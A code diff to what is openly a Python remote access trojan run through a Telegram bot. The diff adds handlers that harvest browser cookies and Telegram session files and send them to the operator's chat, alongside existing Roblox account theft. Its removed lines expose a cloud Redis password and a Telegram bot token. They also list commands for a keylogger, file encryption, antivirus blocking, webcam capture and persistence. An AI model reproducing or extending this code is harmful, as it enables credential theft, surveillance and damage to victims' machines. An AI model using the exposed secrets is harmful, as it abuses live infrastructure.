@@ -28,22 +28,18 @@ from libs.screenshot import screen_save
 from libs.system_info import get_systeminfo as systinfo
 import libs.persistence as persistence_lib
 from libs.roblox import steal_roblox
+from libs.browsers.cookie_lib import BrowserCookieExtractor
+from libs.telegram import telegram as telegram_steal
 
 
-# REDIS_HOST = ""
-# REDIS_PORT = 000
-# REDIS_PASS = ""
+REDIS_HOST = ""
+REDIS_PORT = 000
+REDIS_PASS = ""
 
-# TELEGRAM_BOT_TOKEN = ""
-# NOTIFY_CHATID = ""
-
-REDIS_HOST = "redis-10126.c212.ap-south-1-1.ec2.redns.redis-cloud.com"
-REDIS_PORT = 10126
-REDIS_PASS = "9HLUf4WD9z3ycFYinde3LZg4qDKTUSIU"
+TELEGRAM_BOT_TOKEN = ""
+NOTIFY_CHATID = ""
 
 
-TELEGRAM_BOT_TOKEN= "7790988267:AAEdQCnp0AjzxBHDubRdkQT19LwXT5a5Qtc"
-NOTIFY_CHATID = "7186259386"
 
 redis_client = redis.Redis(
     host= REDIS_HOST,
@@ -300,62 +296,28 @@ async def download_file(file_id, file_name, NOTIFY_CHATID):
 
 @command_handler("/upload")
 async def handle_upload(data, *args):
-    """Handle the /upload command and wait for a file to be uploaded."""
-    
-    await send_message(NOTIFY_CHATID, "Please upload a file (document, photo, video, or audio). You have 60 seconds.")
+    """Handle the /upload command and check Redis for file uploads."""
+
+    await send_message(NOTIFY_CHATID, "Waiting for a file upload... You have 60 seconds.")
+    timeout = 60
+    start_time = time.time()
 
     try:
-        timeout = 60
-        start_time = time.time()
-
-        
-        offset = redis_client.get("telegram_offset")
-        if offset:
-            offset = int(offset)
-        else:
-            offset = 0  
-
         while time.time() - start_time < timeout:
-            response = requests.get(f"{TELEGRAM_API_URL}/getUpdates", params={"offset": offset, "timeout": 10})
-            updates = response.json()
+            # Check the Redis list for file uploads
+            file_data_json = redis_client.lpop("file_uploads")
 
-            if updates.get("ok") and updates["result"]:
-                for update in updates["result"]:
-                    offset = update["update_id"] + 1
-                    redis_client.set("telegram_offset", offset)
+            if file_data_json:
+                file_data = json.loads(file_data_json)
+                file_id = file_data["file_id"]
+                file_name = file_data["file_name"]
+                file_type = file_data["type"]
 
-                    if "message" in update and update["message"]["chat"]["id"] == NOTIFY_CHATID:
-                        message = update["message"]
+                # Download the file
+                await download_file(file_id, file_name, NOTIFY_CHATID)
 
-                        if "document" in message:
-                            file_id = message["document"]["file_id"]
-                            file_name = message["document"].get("file_name", f"document_{file_id}")
-                            await download_file(file_id, file_name, NOTIFY_CHATID)
-                            return
-
-                        elif "photo" in message:
-                            file_id = message["photo"][-1]["file_id"]
-                            file_name = f"photo_{file_id}.jpg"
-                            await download_file(file_id, file_name, NOTIFY_CHATID)
-                            return
-
-                        elif "video" in message:
-                            file_id = message["video"]["file_id"]
-                            file_name = message["video"].get("file_name", f"video_{file_id}.mp4")
-                            await download_file(file_id, file_name, NOTIFY_CHATID)
-                            return
-
-                        elif "audio" in message:
-                            file_id = message["audio"]["file_id"]
-                            file_name = message["audio"].get("file_name", f"audio_{file_id}.mp3")
-                            await download_file(file_id, file_name, NOTIFY_CHATID)
-                            return
-
-                        elif "voice" in message:
-                            file_id = message["voice"]["file_id"]
-                            file_name = f"voice_{file_id}.ogg"
-                            await download_file(file_id, file_name, NOTIFY_CHATID)
-                            return
+                await send_message(NOTIFY_CHATID, f"File ({file_type}) '{file_name}' successfully received and processed.")
+                return
 
             await asyncio.sleep(1)
 
@@ -1270,10 +1232,34 @@ async def handle_status(data, *args):
     
     await send_message(NOTIFY_CHATID, f"Computer {COMPUTER_ID} is active.")
 
+
+
 @command_handler("/roblox")
 async def handle_status(data, *args):
     for i in steal_roblox():
         await send_markdown(chat_id=NOTIFY_CHATID, markdown_text=i)
+
+@command_handler("/cookies")
+async def handle_status(data, *args):
+    extractor = BrowserCookieExtractor()
+
+    
+    print("Extracting cookies from all supported browsers...")
+    all_cookies = extractor.extract_browser_cookies()
+    print("Creating a ZIP file with all cookies...")
+    zip_file_path = extractor.create_zip(all_cookies)
+
+    await send_document(chat_id=NOTIFY_CHATID, document_path=zip_file_path)
+
+@command_handler("/telegram_session")
+async def handle_status(data, *args):
+    
+    try:
+        zip_file_path = telegram_steal()
+        await send_document(chat_id=NOTIFY_CHATID, document_path=zip_file_path)
+    except:
+        await send_message(chat_id=NOTIFY_CHATID, text="Failed to get telegram session data, most likely telegram isn't installed")
+
 
 
 
@@ -1293,89 +1279,6 @@ async def register_computer():
 
         await asyncio.sleep(30)
 
-keyboard_payload = {
-    "chat_id": NOTIFY_CHATID,
-    "text": "Choose a command",
-    "reply_markup": {
-        "keyboard": [
-            [
-                { "text": "/list_computers" },
-                { "text": "/set_computer" }
-            ],
-            [
-                { "text": "/status" },
-                { "text": "/sys_info" }
-            ],
-            [
-                { "text": "/screenshot" },
-                { "text": "/capture_webcam" },
-                { "text": "/list_cameras" }
-            ],
-            [
-                { "text": "/block_av" },
-                { "text": "/unblock_av" },
-                { "text": "/block_domain" },
-                { "text": "/unblock_domain" }
-            ],
-            [
-                { "text": "/start_keylogger" },
-                { "text": "/stop_keylogger" }
-            ],
-            [
-                { "text": "/encrypt_files" },
-                { "text": "/decrypt_files" }
-            ],
-            [
-                { "text": "/set_proxy" },
-                { "text": "/start_proxy" },
-                { "text": "/stop_proxy" }
-            ],
-            [
-                { "text": "/type" },
-                { "text": "/open_url" },
-                { "text": "/change_wallpaper" }
-            ],
-            [
-                { "text": "/set_volume" },
-                { "text": "/get_volume" }
-            ],
-            [
-                { "text": "/start_audio" },
-                { "text": "/stop_audio" }
-            ],
-            [
-                { "text": "/msg_box" },
-                { "text": "/jumpscare" }
-            ],
-            [
-                { "text": "/ps" },
-                { "text": "/pskill" }
-            ],
-            [
-                { "text": "/cd" },
-                { "text": "/pwd" },
-                { "text": "/ls" }
-            ],
-            [
-                { "text": "/move" },
-                { "text": "/copy" },
-                { "text": "/delete" },
-                { "text": "/mkdir" }
-            ],
-            [
-                { "text": "/tts" },
-                { "text": "/set_key" }
-            ],
-            [
-                { "text": "/apply_persistence" },
-                { "text": "/list_persistence_methods" },
-                { "text": "/persistence_help" }
-            ]
-        ],
-        "resize_keyboard": True,
-        "one_time_keyboard": False
-    }
-}
 
 
 
@@ -1392,18 +1295,14 @@ async def main():
     #persistence_lib.apply_persistence(method='task', stealth_name='KernelMgr', key_name='KernelMgr')
 
 
-
     await send_message(
         chat_id=NOTIFY_CHATID,
         text=f"{COMPUTER_ID} successfully connected!"
     )
-    response = requests.post(TELEGRAM_API_URL, json=keyboard_payload)
+    
 
     print(f"Starting command listener for {COMPUTER_ID}...")
     await asyncio.gather(send_status_update(), command_listener())
-
-
-
 
 
 
